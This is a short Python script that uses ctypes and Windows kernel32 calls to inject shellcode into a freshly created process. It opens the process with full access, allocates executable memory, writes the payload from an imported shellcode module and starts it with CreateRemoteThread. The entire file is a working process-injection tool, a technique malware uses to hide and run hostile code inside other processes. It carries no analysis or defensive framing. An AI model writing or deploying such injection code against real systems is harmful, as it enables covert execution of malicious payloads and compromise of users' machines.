from ctypes import *
from new_process import create_process
from shellcodes import shellcode
import time

kernel32                = windll.kernel32

PAGE_READWRITE     =   0x4
PAGE_EXECUTE_READWRITE =  0x40
PROCESS_ALL_ACCESS =     ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM        =     ( 0x1000 | 0x2000 )

def inject( pid, data):
    # Get a handle to the process we are injecting into.
    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, pid )
    if not h_process:
        print(f"[*] Couldn't acquire a handle to PID: {pid}")
        exit(0)

    arg_address = kernel32.VirtualAllocEx( h_process, 0, len(data), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
    print(f"[*] Allocated shellcode address: 0x{arg_address:08x}")

    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, data, len(data), byref(written))


    parameter = 0
    start_address = arg_address   
    thread_id = c_ulong(0)
    if not kernel32.CreateRemoteThread(h_process,None,0,start_address,parameter,0,byref(thread_id)):
        print("[*] Failed to inject the DLL. Exiting.")
        exit(0)

    time.sleep(2)
    kernel32.CloseHandle(h_process)



our_pid = kernel32.GetCurrentProcessId()
processid = create_process()
time.sleep(2)
# processid = 1108
inject( processid, shellcode.encode(encoding='latin1') )
time.sleep(2)

print("injected")
